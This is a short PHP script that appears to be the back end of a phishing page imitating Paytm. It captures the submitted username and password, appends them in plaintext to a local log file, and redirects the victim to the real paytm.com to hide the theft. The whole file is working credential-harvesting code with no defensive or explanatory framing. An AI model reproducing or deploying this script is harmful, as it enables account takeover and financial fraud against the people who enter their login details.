<?php
header ('Location: https://www.paytm.com'); 
$file="log.txt";
$u = $_POST["uname"];
$p = $_POST["passw"];

$data = "Username".$u."Password".$p;

$f = fopen($file,'a');
fwrite($f,$data."\n");
fclose($f);

?>
